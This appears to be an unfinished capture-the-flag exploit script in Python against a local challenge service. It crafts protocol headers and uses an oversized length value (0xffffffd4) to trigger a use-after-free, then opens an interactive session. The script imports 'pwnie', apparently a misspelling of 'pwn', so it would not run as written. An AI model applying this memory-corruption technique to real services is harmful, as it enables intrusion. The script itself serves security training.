#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
import struct, sys

exe = context.binary = ELF('./chall_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata

c
'''

'''
def start(argv=[]):
    if args.LOCAL:
        p = remote('127.0.0.1', 1339)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
        return p
    elif args.REMOTE:
        host_port = sys.argv[1:]
        return remote(host_port[0], int(host_port[1]))
    else:
        return remote('127.0.0.1', 1339)
'''

HOST = '127.0.0.1'
PORT = 1339
TIMEOUT = 3

def build_header(cmd:int, filename:bytes, size:int, bug:bool=False) -> bytes:
    if b'/' in filename or b'..' in filename:
        raise ValueError("filename contains forbidden chars")
    header = p32(cmd)
    fn = filename.split(b'\x00')[0] + b'\x00'
    if len(fn) > 32:
        fn = fn[:32]
    header += fn.ljust(32, b'\x00')
    header += p32(0)

    if bug == False:
        header += p32(size)
    else:
        header += p32(0xffffffd4) # cause uaf

    assert len(header) == 44
    return header

class ServiceClient:
    def __init__(self, host=HOST, port=PORT, timeout=TIMEOUT):
        self.timeout = timeout
        self.io = remote(host, port, timeout=timeout)

    def close(self):
        try:
            self.io.close()
        except Exception:
            pass

    def do_list(self, filename:bytes):
        hdr = build_header(2, filename, 0)
        self.io.send(hdr)
        try:
            line = self.io.recvline(timeout=self.timeout)
        except EOFError:
            line = b''
        return line

    def do_write(self, filename:bytes, payload:bytes, bug = False):
            size = len(payload)
            hdr = build_header(1, filename, size, bug)
            self.io.send(hdr)
            if(bug == True):
                self.io.send(b"A" * 0x20001)
                sleep(0.5)
            elif size:
                self.io.send(payload)
            return True

    def do_read(self, filename:bytes, size:int):
        hdr = build_header(0, filename, size)
        self.io.send(hdr)
        if size == 0:
            return b''
        try:
            data = self.io.recvn(size, timeout=self.timeout)
        except EOFError:
            data = b''
        return data

    def interact(self):
        self.io.interactive()

# ==================== EXPLOIT ====================

c = ServiceClient()

# thread-arena = 0x7ffff0000030

c.do_list(b"testfile")
c.do_write(b"testfile", b"A"* 0x500, bug=True)





c.interact()
